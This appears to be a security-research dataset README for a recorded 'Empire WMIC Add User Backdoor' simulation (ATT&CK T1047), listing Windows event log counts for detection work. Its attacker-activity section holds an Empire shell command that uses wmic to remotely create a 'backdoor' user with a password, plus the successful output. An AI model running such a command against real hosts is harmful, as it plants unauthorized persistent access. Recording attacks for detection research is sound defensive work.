# Empire WMIC Add User Backdoor

Adversaries can use wmic to remotely execute code and add a backdoor user for persistence.

## Technique(s) ID

T1047

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_wmic_add_user.tar.gz](./empire_wmic_add_user.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18231333

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             578 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             193 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             129 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              32 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |              26 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              25 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              24 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |              22 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              12 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | User Account Management                                |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security Group Management                              |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Authentication Service                        |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | SAM                                                    |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             289 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             212 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             178 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             138 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              30 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              18 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               7 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               6 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             481 |

## Attacker Activity

```
(Empire: V6W3TH8Y) > shell wmic /node:IT001 process call create "net user /add backdoor pa$$w0rd1"
[*] Tasked V6W3TH8Y to run TASK_SHELL
[*] Agent V6W3TH8Y tasked with task ID 12
(Empire: V6W3TH8Y) > Executing (Win32_Process)->Create()

Method execution successful.

Out Parameters:
instance of __PARAMETERS
{
	ProcessId = 6580;
	ReturnValue = 0;
};

..Command execution completed.

(Empire: V6W3TH8Y) >
```